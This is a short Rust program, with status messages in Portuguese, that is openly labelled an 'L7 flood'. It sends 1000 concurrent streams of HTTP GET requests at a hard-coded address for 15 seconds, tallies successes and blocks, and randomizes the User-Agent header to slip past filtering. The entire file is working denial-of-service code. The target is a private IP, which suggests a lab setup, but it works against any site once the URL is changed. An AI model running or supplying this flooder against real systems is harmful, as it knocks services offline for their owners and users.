use reqwest::Client;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::time::sleep;

const TARGET_URL: &str = "http://192.168.0.15/";
const CONCURRENCY: usize = 1000;
const DURATION_SECS: u64 = 15;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("[*] Iniciando flood L7 contra {}", TARGET_URL);
    println!(
        "[*] Concorrência: {} | Duração: {}s\n",
        CONCURRENCY, DURATION_SECS
    );

    let client = Client::builder()
        .timeout(Duration::from_secs(2))
        .pool_max_idle_per_host(CONCURRENCY)
        .build()?;

    let client = Arc::new(client); 
    let success_count = Arc::new(AtomicUsize::new(0));
    let error_count = Arc::new(AtomicUsize::new(0));

    let start_time = Instant::now();
    let end_time = start_time + Duration::from_secs(DURATION_SECS);

    for _ in 0..CONCURRENCY {
        let client = Arc::clone(&client);
        let success = Arc::clone(&success_count);
        let errors = Arc::clone(&error_count);
        
        let local_end_time = end_time; 

        tokio::spawn(async move {
            loop {
                let ua = format!("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{}.0.{}.0 Safari/537.36", 
                    rand::random::<u8>() % 20 + 90, rand::random::<u8>() % 100);

                let req = client.get(TARGET_URL).header("User-Agent", ua);

                match req.send().await {
                    Ok(resp) => {
                        if resp.status().is_success() || resp.status().is_redirection() {
                            success.fetch_add(1, Ordering::Relaxed);
                        } else {
                            errors.fetch_add(1, Ordering::Relaxed);
                        }
                    }
                    Err(_) => {
                        errors.fetch_add(1, Ordering::Relaxed);
                    }
                }

                if Instant::now() >= local_end_time {
                    break;
                }

                tokio::task::yield_now().await;
            }
        });
    }

    let monitor_start = Instant::now();
    while monitor_start.elapsed().as_secs() < DURATION_SECS {
        sleep(Duration::from_secs(1)).await;
        let s = success_count.load(Ordering::Relaxed);
        let e = error_count.load(Ordering::Relaxed);

        print!("\r[+] Sucessos: {:>7} | Erros/Bloqueios: {:>7}", s, e);
        use std::io::{self, Write};
        io::stdout().flush().unwrap();
    }

    println!("\n\n[*] Tempo esgotado. Aguardando tasks terminarem...");
    
    sleep(Duration::from_secs(2)).await;

    println!("[Resumo Final]");
    println!("- Sucesso: {}", success_count.load(Ordering::Relaxed));
    println!("- Erros : {}", error_count.load(Ordering::Relaxed));

    Ok(())
}